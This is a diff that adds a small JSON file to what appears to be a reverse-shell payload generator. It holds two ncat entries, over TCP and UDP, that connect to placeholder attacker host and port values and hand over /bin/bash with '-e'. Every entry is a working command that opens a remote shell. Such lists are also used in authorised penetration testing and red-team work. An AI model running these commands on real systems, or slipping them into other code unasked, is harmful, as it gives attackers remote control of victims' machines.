@@ -1,0 +1,16 @@
+[
+  {
+    "type": "ncat",
+    "direction": "reverse",
+    "payload": "ncat {LHOST} {LPORT} -e /bin/bash",
+    "note": null,
+    "id": "ncat1"
+  },
+  {
+    "type": "ncat",
+    "direction": "reverse",
+    "payload": "ncat --udp {LHOST} {LPORT} -e /bin/bash",
+    "note": null,
+    "id": "ncat2"
+  }
+]
